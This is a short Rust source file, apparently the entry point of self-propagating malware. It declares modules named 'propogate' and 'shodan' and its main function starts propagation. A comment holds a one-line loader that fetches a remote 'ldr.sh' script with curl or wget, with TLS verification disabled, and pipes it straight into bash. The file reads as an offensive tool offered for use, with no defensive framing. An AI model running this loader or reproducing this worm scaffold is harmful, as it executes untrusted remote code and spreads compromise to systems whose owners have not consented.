mod propogate;
mod shodan;

use env_logger::{Builder, Env};


// (curl -kL https://github.com/proxin187/lapras/raw/refs/heads/main/ldr.sh || wget -q --no-check-certificate -O- https://github.com/proxin187/lapras/raw/refs/heads/main/ldr.sh ) | bash

fn main() {
    Builder::from_env(Env::default().default_filter_or("info")).init();

    propogate::run();
}


